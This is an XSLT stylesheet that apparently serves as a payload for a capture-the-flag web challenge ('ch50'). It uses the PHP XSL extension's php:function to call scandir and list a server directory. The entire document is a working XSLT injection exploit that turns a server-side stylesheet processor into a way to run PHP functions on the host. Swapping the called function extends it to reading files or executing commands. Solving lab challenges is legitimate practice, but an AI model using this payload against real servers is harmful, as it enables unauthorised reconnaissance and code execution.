<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"
  exclude-result-prefixes="php">

  <xsl:output method="html" encoding="UTF-8" />

  <xsl:template match="/">
    <html>
      <body>
        <h2>Files in directory /challenge/web-serveur/ch50/</h2>
        <pre>
<xsl:for-each select="php:function('scandir', '/challenge/web-serveur/ch50/')">
  <xsl:value-of select="."/>
  <xsl:text>&#10;</xsl:text>
</xsl:for-each>
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
